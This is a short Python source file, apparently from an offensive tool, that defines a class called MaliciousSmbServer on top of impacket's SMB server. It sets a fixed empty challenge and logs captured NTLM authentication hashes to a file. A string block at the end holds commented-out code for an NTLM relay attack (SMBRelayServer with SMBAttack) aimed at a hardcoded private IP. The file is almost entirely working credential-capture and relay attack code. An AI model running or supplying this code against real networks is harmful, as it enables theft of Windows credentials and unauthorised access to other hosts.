from impacket.smbserver import SimpleSMBServer
import logging
from loguru import logger
from .interceptlogging import InterceptHandler
from loguru import logger

from impacket.examples.logger import init


class MaliciousSmbServer(SimpleSMBServer):
    """[ Class that contains the configuration for the smbserver ]

    Args:
        lhost (str): [ ip of the host that will start the smb server ]
        port (str): [ port for the smb server ]
    """

    def __init__(self, lhost: str, port: str) -> None:
        super().__init__(listenAddress=lhost, listenPort=int(port))
        self._lhost = lhost
        self._port = port
        self.output_of_connections()

    @property
    def lhost(self) -> str:
        return self._lhost

    @property
    def port(self) -> str:
        return self._port

    @port.setter
    def port(self, port: str) -> None:
        self._port = port

    def output_of_connections(self) -> None:
        logger.bind(name="ntlm").add(
            "logs/hashes_ntlm.log",
            level="INFO",
            rotation="1 week",
        )

    def start_malicious_smbserver(self) -> None:
        """[ Function to start the smb server ]"""
        logging.basicConfig(handlers=[InterceptHandler()], level=0)
        super().setSMBChallenge("")
        super().start()

    """
        import logging
        from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
        from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
        from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
        from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
        from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

        # init(False)
        Ataques = {"SMB": SMBAttack}
        Clientes = {"SMB": SMBRelayClient}
        target = TargetsProcessor(
            singleTarget="192.168.253.130",
            protocolClients=Clientes,
        )
        config = NTLMRelayxConfig()
        config.setMode("RELAY")
        config.target = target
        config.setAttacks(Ataques)
        config.setProtocolClients(Clientes)
        config.setSMB2Support(True)
        config.interfaceIp = "192.168.253.135"
        server = SMBRelayServer(config)
        server.start()
        server.join()
        print("hola")
"""
